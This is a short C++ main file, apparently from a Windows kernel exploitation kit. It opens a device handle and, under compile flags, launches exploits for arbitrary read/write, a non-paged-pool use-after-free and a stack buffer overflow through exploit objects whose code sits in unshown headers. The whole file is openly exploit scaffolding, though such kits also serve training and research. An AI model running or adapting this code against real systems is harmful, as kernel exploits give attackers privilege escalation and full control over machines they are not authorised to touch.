#include "AEK.h"
#include "Exploits.h"

int main() {
#ifdef ARAW

	CreateDevice();
	krnlmagic::ex.ArbitraryReadRoutine = ARRoutine;
	krnlmagic::ex.ArbitraryWriteRoutine = AWRoutine;
	krnlmagic::ex.Exploit();

#endif // ARAW



#ifdef NPP_UAF

	CreateDevice();

	aek::ex.AllocateTriggerPool = _AllocateTriggerPool;
	aek::ex.AllocateFakePool = _AllocateFakePool;
	aek::ex.FreeTriggerPool = _FreeTriggerPool;
	aek::ex.TriggerCallbackFunction = _TriggerCallbackFunction;
	aek::ex.SetChunkSize(CHUNK_SIZE);
	aek::ex.Exploit();

#endif // NPP_UAF

#ifdef BOF

	CreateDevice();
	aek::ex.SetDummySize(DUMMY_SIZE);
	aek::ex.TriggerStackOverflow = _TriggerStackOverflow;
	aek::ex.Exploit();

#endif	// Stack BOF
	
	return 0;
}